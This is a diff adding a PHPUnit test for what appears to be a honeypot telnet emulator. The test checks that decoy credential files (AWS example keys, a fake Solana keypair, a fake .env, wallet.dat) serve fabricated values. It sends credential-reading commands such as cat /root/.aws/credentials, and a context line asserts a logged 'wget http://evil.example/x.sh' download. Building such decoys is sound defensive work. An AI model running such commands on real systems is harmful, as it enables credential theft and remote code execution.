@@ -120,6 +120,34 @@ final class ProtocolEngineTest extends TestCase
         self::assertContains('wget http://evil.example/x.sh', $log);
     }
 
+    public function test_telnet_shell_serves_fabricated_loot_files(): void
+    {
+        // The fake box stages crypto/cloud/app "loot" so scanners waste time hunting it. Verify a
+        // few of those files cat cleanly and carry their fabricated markers — the values are inert.
+        $e = $this->emu('telnet');
+        $s = new ProtocolSession(9);
+        $e->banner($s);
+        $e->feed("root\r\n", $s);       // username -> password prompt
+        $e->feed("hunter2\r\n", $s);    // accept-all login
+
+        // Cloud creds: AWS's documented example key IDs (never live).
+        $aws = $e->feed("cat /root/.aws/credentials\r\n", $s);
+        self::assertStringContainsString('AKIAIOSFODNN7EXAMPLE', $aws);
+        self::assertStringContainsString('EXAMPLEKEY', $aws);
+
+        // Solana keypair: a constant deadbeef byte pattern, not a random funded key.
+        $sol = $e->feed("cat ~/.config/solana/id.json\r\n", $s);  // tilde must expand to /root
+        self::assertStringContainsString('222,173,190,239', $sol);
+
+        // App secrets: fabricated DB password + Stripe token markers.
+        $env = $e->feed("cat /var/www/html/.env\r\n", $s);
+        self::assertStringContainsString('S3cr3t-f4ke-db-p4ss', $env);
+        self::assertStringContainsString('sk_live_FAKEstripe', $env);
+
+        // The loot is discoverable: it shows up when listing the home directory.
+        self::assertStringContainsString('wallet.dat', $e->feed("ls /root\r\n", $s));
+    }
+
     public function test_telnet_interactive_char_mode_cr_iac_and_backspace(): void
     {
         // A real telnet client sends keystrokes one at a time, ends a line with a BARE CR (no LF),
